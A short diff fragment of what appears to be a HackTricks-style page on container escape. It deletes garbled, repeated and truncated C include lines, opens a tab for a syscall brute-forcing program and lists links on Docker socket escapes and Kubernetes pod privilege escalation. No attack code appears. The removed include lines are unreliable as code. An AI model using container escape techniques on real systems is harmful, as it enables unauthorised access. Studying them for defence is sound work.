-#include <linux/if_arp.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#include <linux/if_ether.h>
-#includejson.h>
-#include <linux/filter.h>
-#include <linux/audit
+{% tab title="syscall_bf.c" %}
 ````c
 // From a conversation I had with @arget131
 // Fir bfing syscalss in x64
@@ -1231,7 +629,7 @@ If you are in **userspace** (**no kernel exploit** involved) the way to find new
 * [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket)
 * [https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4)
 
-<figure><img src="../../../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
 Get Access Today:
